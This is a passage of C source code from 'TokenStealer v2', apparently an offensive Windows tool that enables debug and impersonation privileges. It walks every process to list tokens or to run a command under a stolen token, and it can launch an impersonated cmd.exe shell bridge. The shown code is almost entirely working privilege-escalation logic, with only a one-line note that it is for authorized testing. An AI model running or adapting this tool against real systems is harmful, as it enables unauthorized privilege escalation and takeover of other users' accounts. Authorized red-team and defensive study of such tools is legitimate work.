		printf("[-] Invalid port: %d (use 1-65535).\n", BridgePort);
		return 1;
	}

	if (BridgeMode)
	{
		RunShellClient();
		return 0;
	}

	if (out_csv || out_json)
		list_mode = TRUE;

	if (interactive)
	{
		extended_list = FALSE; /* the menu works with plain account names */
		list_mode = TRUE;
	}

	if (!out_csv && !out_json)
	{
		printf("TokenStealer v2 - Windows token enumerator / impersonator\n");
		printf("Based on decoder-it/TokenStealer. Use only on systems you are authorized to test.\n\n");
	}

	if (command == NULL && !list_mode && !ForceBridge) {
		usage();
		return 1;
	}


	SetWinDesktopPerms();
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(),
		TOKEN_ALL_ACCESS, &hToken);
	

	HasAssignPriv = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
	EnablePriv(hToken, SE_IMPERSONATE_NAME);
	EnablePriv(hToken, SE_DEBUG_NAME);

	/* -w: force impersonation + bridge for -u <user>, without the menu. */
	if (ForceBridge)
	{
		if (User_to_impersonate == NULL)
		{
			printf("[-] -w requires -u <user>.\n");
			return 1;
		}
		RunLocalShellBridge((command != NULL && command[0] != L'\0')
			? command : L"cmd.exe");
		return 0;
	}

	if (pid == 0)
	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		BOOL b;
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			return 1;
		}


	

		cProcesses = cbNeeded / sizeof(DWORD);

	

		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0)
			{

				if (list_mode)
				{
				
					ListTokens(aProcesses[i], extended_list);
				}
				else
				{

			

					b = ExecuteWithToken(command, aProcesses[i]);
					
					if (b)
					{
						printf("[+] Success using a token from process %lu\n", aProcesses[i]);
						break;
					}
				}
			}
		}
		
		if (list_mode)
		{
			if (interactive && !out_csv && !out_json && num_TokenUsers > 0)
				RunInteractive();
			else if (out_csv)
				ExportCsv(extended_list);
			else if (out_json)
				ExportJson(extended_list);
			else if (num_TokenUsers == 0)
			{
				printf("\n[!] No tokens found.\n");
				printf("    Try running elevated (Administrator/SYSTEM) or remove filters (-u/-p/-s/-b).\n\n");
			}
			else
			{
				printf("\n[+] %d unique account%s found:\n\n",
					num_TokenUsers, num_TokenUsers == 1 ? "" : "s");
				PrintAccountTable(extended_list);
				printf("\n");
			}
		}

	}
	else
	{

		if (list_mode)

		{
			ListTokens(pid, extended_list);
			if (interactive && !out_csv && !out_json && num_TokenUsers > 0)
				RunInteractive();
			else if (out_csv)
				ExportCsv(extended_list);
			else if (out_json)
				ExportJson(extended_list);
			else if (num_TokenUsers == 0)
			{
				printf("\n[!] No tokens found for that process.\n");
				printf("    Try running elevated (Administrator/SYSTEM) or remove filters (-u/-p/-s/-b).\n\n");
			}
			else
			{
				printf("\n[+] %d unique account%s found:\n\n",
					num_TokenUsers, num_TokenUsers == 1 ? "" : "s");
				PrintAccountTable(extended_list);
				printf("\n");
			}
		}
		else
		{
			ExecuteWithToken(command, pid);
		}

	}
	return 0;
}

